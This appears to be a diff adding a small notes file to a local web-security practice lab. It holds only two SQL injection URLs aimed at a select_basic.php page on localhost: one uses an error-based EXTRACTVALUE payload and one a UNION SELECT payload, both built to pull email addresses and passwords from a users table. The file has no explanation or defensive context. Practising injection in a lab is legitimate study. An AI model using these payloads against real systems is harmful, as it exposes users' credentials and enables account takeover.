@@ -1,0 +1,3 @@
+http://localhost/websecurity/sql/select_basic.php?author='+AND+EXTRACTVALUE(0,(SELECT+CONCAT('$',email,':',password)+FROM+users+LIMIT+0,1))+%23
+
+http://localhost/websecurity/sql/select_basic.php?author='+UNION+SELECT+email,password,NULL,NULL+FROM+users--+
